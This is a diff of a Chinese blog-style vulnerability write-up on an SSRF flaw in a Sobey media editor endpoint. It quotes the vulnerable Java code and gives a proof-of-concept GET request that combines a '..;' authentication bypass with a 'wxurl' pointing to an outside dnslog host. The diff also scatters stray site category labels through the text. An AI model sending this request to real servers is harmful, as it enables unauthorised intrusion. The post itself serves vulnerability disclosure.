@@ -24,6 +24,16 @@ asset_dir: embedded-base64
 
 直接进入看它的实现逻辑如下
 
+计算机科学
+
+深入探索
+
+字典与百科全书
+
+数据格式与协议
+
+软件
+
 ```
 @RequestMapping(
     value = {"/wxArticleInfo"},
@@ -47,17 +57,9 @@ public Response wxArticleInfo(@RequestParam("token") String token, @RequestParam
 }
 ```
 
-深入探索
-
-防病毒程序与恶意软件
-
-编程
-
-blog
-
 参数**wxurl**被带入`parseWXDoc`方法，跟进查看其实现逻辑
 
-数据管理
+黑客与破解
 
 ```
 private static Map<String, String> parseWXDoc(String requestUrl) {
@@ -90,7 +92,7 @@ requestUrl被直接使用Jsoup.connect进行访问，整个过程中对**wxurl�
 
 > 权限绕过相关分析可以参考之前的 [索贝融媒体 getList SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html) 的权限校验部分
 >
-> 黑客与破解
+> 参考信息
 
 ```
 GET /sobey-mchEditor/js/..;/mch/WXArticleInt/wxArticleInfo?siteCode=&token=&wxurl=http://xxe.dnslog.pt/xxe_test HTTP/1.1
